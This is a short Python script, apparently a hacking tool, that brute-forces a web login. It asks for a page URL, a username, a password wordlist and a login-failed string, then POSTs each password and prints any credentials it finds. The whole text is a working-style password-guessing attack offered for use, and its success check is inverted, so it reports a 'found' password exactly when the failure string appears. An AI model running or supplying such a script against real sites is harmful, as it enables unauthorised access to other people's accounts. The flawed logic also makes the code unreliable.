import requests
from termcolor import colored

url = input('[+] Enter Page URL:')
username = input('[+] Enter Username For the account to BruteForce:')
passwords_file = input('[+] Enter Passwords File to Use:')
login_failed_string = input('[+] Enter Login Failed String that Occurs when login fails:')


def cracking(username,url):
  for password in passwords:
    password = password.strip()
    print(colored(('Trying ' + password), 'red'))
    data = {'username': username, 'password': password, 'login': 'submit'}
    response = requests.post(url, data=data)
    if login_failed_string not in response.content.decode():
        pass
    else:
        print(colored(('[+] Found Username : ==> ' + username), 'green'))
        print(colored(('[+] Found Password : ==> ' + password), 'green'))
        exit()

with open(passwords_file, 'r') as passwords:
  cracking(username,url)

print('[!!] Password Not in list')
